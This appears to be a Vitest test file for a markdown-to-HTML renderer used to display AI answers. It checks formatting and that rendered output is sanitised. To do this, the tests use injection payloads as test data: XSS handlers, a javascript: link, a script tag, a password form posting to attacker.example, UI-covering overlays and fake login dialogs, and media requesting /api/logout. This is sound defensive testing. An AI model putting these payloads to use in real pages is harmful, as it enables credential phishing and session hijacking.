// @vitest-environment jsdom
import { describe, expect, it } from "vitest";

import { mdToBlocks, mdToHtml } from "#layers/ai/app/utils/md-to-html";

const render = (markdown: string): HTMLElement => {
  const container = document.createElement("div");
  container.innerHTML = mdToHtml(markdown);
  return container;
};

describe("message markdown", () => {
  it("renders the formatting of an answer", () => {
    const html = render(
      ["# Title", "", "Some **bold** text with a [link](https://example.com).", "", "- [x] done", "- [ ] pending"].join(
        "\n",
      ),
    );
    expect(html.querySelector("h1")?.textContent).toBe("Title");
    expect(html.querySelector("strong")?.textContent).toBe("bold");
    expect(html.querySelector("a")?.getAttribute("href")).toBe("https://example.com");
    expect(html.querySelector("a")?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    const checkboxes = [...html.querySelectorAll("input")];
    expect(checkboxes.map((input) => [input.type, input.disabled, input.checked])).toEqual([
      ["checkbox", true, true],
      ["checkbox", true, false],
    ]);
  });

  it("splits an answer into blocks that render like the whole answer", () => {
    const markdown = [
      "# Title",
      "",
      "Some text",
      "on two lines.",
      "",
      "1. one",
      "",
      "   more of one",
      "2. two",
      "",
      "| a | b |",
      "| - | - |",
      "| 1 | 2 |",
      "",
      "```js",
      "const a = 1;",
      "",
      "const b = 2;",
      "```",
      "",
      "> quote",
    ].join("\n");
    const blocks = mdToBlocks(markdown);
    expect(blocks).toHaveLength(6);
    expect(blocks.map((block) => mdToHtml(block)).join("")).toBe(mdToHtml(markdown));

    expect(mdToBlocks("<details>\n\nHidden\n\n</details>")).toHaveLength(1);
    expect(mdToBlocks("See [the docs][docs].\n\n[docs]: https://example.com")).toHaveLength(1);
  });

  it("drops the scripts, styles and classes that would change the application", () => {
    const html = render(
      [
        "Summary.",
        "",
        "<style>.overlay{position:fixed;inset:0;background:red}</style>",
        '<div class="overlay fixed inset-0 z-50" style="position:fixed;inset:0">text</div>',
        '<img src="x" onerror="window.xss = 1">',
        '<a href="javascript:window.xss = 2">link</a>',
        "<script>window.xss = 3</script>",
      ].join("\n"),
    );
    expect(html.querySelector("style")).toBeNull();
    expect(html.querySelector("script")).toBeNull();
    expect(html.querySelector("div")?.getAttribute("class")).toBeNull();
    expect(html.querySelector("div")?.getAttribute("style")).toBeNull();
    expect(html.querySelector("img")?.getAttribute("onerror")).toBeNull();
    expect(html.querySelector("a")?.getAttribute("href")).toBeNull();
    expect(html.textContent).toContain("text");
  });

  it("drops the forms that would submit what is typed in them", () => {
    const html = render(
      [
        "Summary.",
        "",
        '<form action="https://attacker.example/steal"><input name="password"><button>Continue</button></form>',
        '<button formaction="https://attacker.example/steal">Continue</button>',
      ].join("\n"),
    );
    expect(html.querySelector("form")).toBeNull();
    expect(html.querySelector("[formaction]")).toBeNull();
  });

  it("drops what would cover the application or request its own URLs", () => {
    const html = render(
      [
        "Summary.",
        "",
        '<svg overflow="visible"><a href="https://attacker.example"><rect width="6000" height="6000"/></a></svg>',
        '<button popovertarget="panel">Details</button><div popover id="panel">Session expired</div>',
        '<button command="show-modal" commandfor="modal">Continue</button><dialog id="modal" open>Log in</dialog>',
        "![logout](/api/logout) ![pixel](data:image/gif;base64,R0lGODlhAQABAAAAACw=)",
        '<video src="/api/logout" poster="/api/logout"></video><table background="/api/logout"></table>',
      ].join("\n"),
    );
    expect(html.querySelector("svg")).toBeNull();
    expect(html.querySelector("[popover], [popovertarget]")).toBeNull();
    expect(html.querySelector("dialog, [command], [commandfor]")).toBeNull();
    expect(html.querySelector("video[src], [poster], [background]")).toBeNull();
    expect([...html.querySelectorAll("img")].map((img) => img.getAttribute("src"))).toEqual([
      null,
      "data:image/gif;base64,R0lGODlhAQABAAAAACw=",
    ]);
  });
});
